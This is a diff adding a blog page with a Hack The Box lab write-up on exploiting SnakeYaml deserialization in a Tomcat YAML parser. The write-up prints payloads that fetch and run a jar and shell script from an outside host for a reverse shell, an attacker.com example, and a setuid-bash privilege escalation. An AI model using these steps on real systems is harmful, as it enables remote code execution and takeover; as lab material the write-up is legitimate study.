@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en"> 
+<head>
+
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-5YK5MXEZF1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-5YK5MXEZF1');
+</script>
+
+
+    <title>Write-ups</title>
+    
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       
+    <link rel="shortcut icon" href="favicon.ico"> 
+    
+    <!-- FontAwesome JS-->
+    <script defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+    
+    <!-- Theme CSS -->  
+    <link id="theme-style" rel="stylesheet" href="assets/css/theme-1.css">
+    
+
+</head> 
+
+<body>
+    
+    <header class="header text-center">	    
+	    <h1 class="blog-name pt-lg-1 mb-0"><a href="index.html">Adventures with Bits  </a></h1>
+        
+	    <nav class="navbar navbar-expand-lg navbar-dark" >
+           
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+			<span class="navbar-toggler-icon"></span>
+			</button>
+
+			<div id="navigation" class="collapse navbar-collapse flex-column" >
+				<div class="profile-section pt-3 pt-lg-0">
+				    <img class="profile-image mb-3 rounded mx-auto" src="assets/images/profile.png" alt="image" >			
+					
+					<div class="bio mb-3">"Technical Problems Can Have Artistic Solutions"<br>
+                                 - Jon Erickson The Art of Exploitation </div><!--//bio-->
+					<ul class="social-list list-inline py-3 mx-auto">
+
+			            <li class="list-inline-item"><a href="https://twitter.com/UnknownHimash"><i class="fab fa-twitter fa-fw"></i></a></li>
+			           
+			            <li class="list-inline-item"><a href="https://github.com/himash"><i class="fab fa-github-alt fa-fw"></i></a></li>
+			            
+			        </ul><!--//social-list-->
+			        
+				</div><!--//profile-section-->
+				
+				<ul class="navbar-nav flex-column text-left">
+					<li class="nav-item">
+					    <a class="nav-link" href="index.html"><i class="fas fa-home fa-fw mr-2"></i>Blog Home <span class="sr-only">(current)</span></a>
+					</li>
+					<li class="nav-item">
+					    <a class="nav-link" href="publications.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Publications</a>
+					</li>
+
+						<li class="nav-item">
+					    <a class="nav-link" href="projects.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Projects</a>
+					</li>
+					<li class="nav-item active">
+					    <a class="nav-link" href="write-up.html"><i class="fas fa-user fa-fw mr-2"></i>Write-ups</a>
+					</li>
+
+					<li class="nav-item">
+					    <a class="nav-link" href="tools.html"><i class="fas fa-user fa-fw mr-2"></i>Tools</a>
+					</li>
+
+					<li class="nav-item active">
+					    <a class="nav-link" href="ack.html"><i class="fas fa-user fa-fw mr-2"></i>Acknowledgements</a>
+					</li>
+
+				</ul>
+				
+				
+			</div>
+		</nav>
+    </header>
+
+
+    <!-----------------------------------Header and stuff Ends Here-------------------------------------------------->
+
+
+
+
+<!-------------------------------------Article Starts Here --------------------------------------------------------------->
+
+
+    <div class="main-wrapper">
+	    
+	    <article class="blog-post px-3 py-5 p-md-5">
+		    <div class="container">
+			    <header class="blog-post-header">
+				    <h2 class="title mb-2">Ophiuchi - HTB</h2>
+				    
+
+			    </header>
+			    
+			    <div class="blog-post-body">
+
+			    	<!-----PICTURE
+				    <figure class="blog-banner">
+				        <a href="https://made4dev.com"><img class="img-fluid" src="assets/images/blog/blog-post-banner.jpg" alt="image"></a>
+
+				        
+				        <figcaption class="mt-2 text-center image-caption">Image Credit: <a href="https://made4dev.com?ref=devblog" target="_blank">made4dev.com (Premium Programming T-shirts)</a></figcaption>
+				    </figure>
+				    -------------------------------------------------------->
+
+				    <p>
+
+				    	<br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-intro.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      Let's start with nmap simple scan to find open ports, nmap results shows port 22 (SSH) and port 8080 (HTTP) is opened.
+				      from the nmap result the machine is running ubuntu and Apache Tomcat 9.0.38 in port 8080.
+
+				      <br><br>
+
+				     
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-nmap.png" alt="image"></a>
+
+				      </figure>
+
+				      <br> 
+
+				      Let's start with port 8080 which is seems to be interesting, navigating to port 8080 presented with 'Online YAML Parser' .
+
+				      <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-web.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      I have checked the source code but nothing interesting there, and 'Need support?' link is not redirecting to any pages.
+				      at this point there is two options to check, Apache Tomcat 9.0.38 vulnerabilities and YAML Parser.
+				      initially checking publicly available exploits & vulnerabilities for the Apache Tomcat version 9.0.38 does not provided anything interesting to try. testing YAML Parser with characters returned internal server error of snakeyaml parser.
+
+
+				      <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-error.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      By looking at the error it is obvious that it is possible to exploit SnakeYaml insecure deserialization.
+				      following resources will provide step by step methods to exploit the vulnerability.<br><br>
+				      <a href='https://github.com/mbechler/marshalsec'> https://github.com/mbechler/marshalsec </a><br>
+				      <a href='https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/'> https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/ </a> <br>
+				      <a href='https://github.com/artsploit/yaml-payload' > https://github.com/artsploit/yaml-payload </a> 
+				      <br><br>
+
+				      This is very interesting vulnerability; the article of 'Man Yue Mo' explained the vulnerability in detail. CVE-2017-1000207 and CVE-2017-1000208 vulnerabilities comes under 'Deserialization of Untrusted Data', CWE-ID 502.
+				      Swagger is the world’s largest framework of API developer tools for the OpenAPI Specification (OAS). Swagger Codegen enables users to automatically generate server and client side REST API code in multiple languages, through a format called Open API definition. The vulnerability in Swagger is actually caused by unsafe use of SnakeYaml.
+				      vulnerability resides under feature of SnakeYaml that it's support for a special syntax that allows the constructor of any Java class to be called when parsing YAML data. For example, consider the following piece of Java code that uses SnakeYaml to parse a string in the malicious variable.
+
+				      <pre>
+				      	<code>
+String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
++ "[[!!java.net.URL [\"http://attacker.com\"]]]]";
+Yaml yaml = new Yaml();            // Unsafe instance of Yaml that allows any constructor to be called.
+Object obj = yaml.load(malicious); // Make request to http://attacker.com
+
+</code>
+</pre>
+
+                       Based on the vulnerability, it is possible to make request to my server to download and execute jar file to get reverse shell from the machine. using the below piece of java code i can make request to my server.
+
+                       <pre>
+                       <code>
+
+!!javax.script.ScriptEngineManager [
+!!java.net.URLClassLoader [[
+!!java.net.URL ["http://10.10.14.73:8000/yaml-payload.jar"]
+]]
+] 
+
+</code>
+</pre>
+
+                        To upload a reverse shell and to execute i used the artsploit github repository yaml-payload generator code with added exec commands. (<a href='https://github.com/artsploit/yaml-payload/tree/master/src/artsploit'> https://github.com/artsploit/yaml-payload/tree/master/src/artsploit </a>)
+
+                        <pre>
+                        <code>
+
+
+Runtime.getRuntime().exec("curl http://10.10.14.73:8000/file.sh -o /tmp/file.sh");
+Runtime.getRuntime().exec("bash /tmp/file.sh");
+
+
+</code>
+</pre>
+
+                            
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-javarun.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>    
+
+
+				      <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-payloadrun.png" alt="image"></a>
+
+				      </figure>
+
+				      <br><br>
+
+				      The generated 'yaml-payload.jar' file, hosted in my local simple python server, has been downloaded and executed by the parser, therefore i got the reverse connection.
+
+				       <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-payload-grab.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				       <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-rev.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+
+				      I got reverse connection as tomcat; I found admin in home directory; to get user.txt need to escalate privileges or find credentials to log in. as i already said in my previous write-ups before trying privilege escalation, just enumerate the files and directories, there is a chance to find credentials from configuration files, log files and etc. checking application directories usually will give something to further move on. upon checking '/opt/tomcat/conf' directory the 'tomcat-users.xml' file exposed admin user password in plain text. here after i can use the admin password to initiate SSH connection to the admin account. using 'whythereisalimit' as password i was able to log in to the admin account and i got the user.txt.   
+
+				       <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-admin.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-priv.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      The file '/opt/wasm-functions/index.go' can be run with root privileges!, to further move on, it is required to check the file index.go and it contains the below code. 
+
+				      <pre>
+				      	<code>
+
+package main
+
+import (
+ "fmt"
+ wasm "github.com/wasmerio/wasmer-go/wasmer"
+ "os/exec"
+ "log"
+)
+
+
+func main() {
+ bytes, _ := wasm.ReadBytes("main.wasm")
+
+ instance, _ := wasm.NewInstance(bytes)
+ defer instance.Close()
+ init := instance.Exports["info"]
+ result,_ := init()
+ f := result.String()
+ if (f != "1") {
+  fmt.Println("Not ready to deploy")
+ } else {
+  fmt.Println("Ready to deploy")
+  out, err := exec.Command("/bin/sh", "deploy.sh").Output()
+  if err != nil {
+   log.Fatal(err)
+  }
+  fmt.Println(string(out))
+ }
+}
+
+
+</code>
+</pre>
+
+                      By analyzing the file, initially the go script importing the wasmer; Wasmer is a fast and secure WebAssembly runtime that enables super lightweight containers to run anywhere. WebAssembly (abbreviated Wasm) is a binary instruction format for a stack-based virtual machine. it provides a way to run code written in multiple languages on the web at near-native speed, with client apps running on the web that previously couldn’t have done so. the script is checking main.wasm file 'f' variable, if it is equals to '1' then it is executing '/bin/sh deploy.sh', another important thing is path is not defined for the files deploy.sh and main.wasm so it is possible to manipulate these files and get root on the machine. by using <a href="https://github.com/webassembly/wabt"> https://github.com/webassembly/wabt </a> this tool i can convert wasm file to wat file to edit the variable. i edited the f variable constant (i32.const 0 to i32.const 1) value of 0 to 1, and converted back to wasm file. 
+
+                       <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-webassm.png" alt="image"></a>
+
+				      </figure>
+
+				      <br><br>
+
+				      I uploaded the modified file to tmp directory in the machine and executed the 'sudo /usr/bin/go run /opt/wasm-functions/index.go', there after i created deploy.sh file in the same directory with  'chmod +s /bin/bash' to change bash with setuid permission. again running 'sudo /usr/bin/go run /opt/wasm-functions/index.go' and  'bash -p' i got the root !.
+
+				       <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-root1.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/Ophiuchi/op-root2.png" alt="image"></a>
+
+				      </figure>
+
+</p>
+
+<!--------------------------------------------Article End ------------------------------------------------------>
+
+
+
+				    <!--------------------------------------------------------------------------------------------- Coding section
+				    <h3 class="mt-5 mb-3">Code Block Example</h3>
+				    <p>You can get more info at <a href="https://highlightjs.org/" target="_blank">https://highlightjs.org/</a>. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. </p>
+				    <pre>
+					    <code>
+function $initHighlight(block, cls) {
+  try {
+    if (cls.search(/\bno\-highlight\b/) != -1)
+      return process(block, true, 0x0F) +
+             ` class="${cls}"`;
+  } catch (e) {
+    /* handle exception */
+  }
+  for (var i = 0 / 2; i < classes.length; i++) {
+    if (checkCondition(classes[i]) === undefined)
+      console.log('undefined');
+  }
+}
+
+export  $initHighlight;
+					    </code>
+				    </pre>
+
+				  Ending here --------------------------------------------------------------------------------------------> 
+
+					
+
+					
+				   
+			    </div>
+				    
+
+				  <!--------------------------------------------------------------------------------- Navigation section  
+			    <nav class="blog-nav nav nav-justified my-5">
+				  <a class="nav-link-prev nav-item nav-link rounded-left" href="index.html">Previous<i class="arrow-prev fas fa-long-arrow-alt-left"></i></a>
+				  <a class="nav-link-next nav-item nav-link rounded-right" href="blog-list.html">Next<i class="arrow-next fas fa-long-arrow-alt-right"></i></a>
+				</nav>
+				-----------------------------------------------------------------------------------------------------------> 
+
+	    </article>
+	    
+
+    
+    </div><!--//main-wrapper-->
+    
+
+
+
+    
+       
+    <!-- Javascript -->          
+    <script src="assets/plugins/jquery-3.3.1.min.js"></script>
+    <script src="assets/plugins/popper.min.js"></script> 
+    <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script> 
+    
+    <!-- Page Specific JS -->
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.14.2/highlight.min.js"></script>
+
+    <!-- Custom JS -->
+    <script src="assets/js/blog.js"></script>
+      
+    
+
+</body>
+</html> 
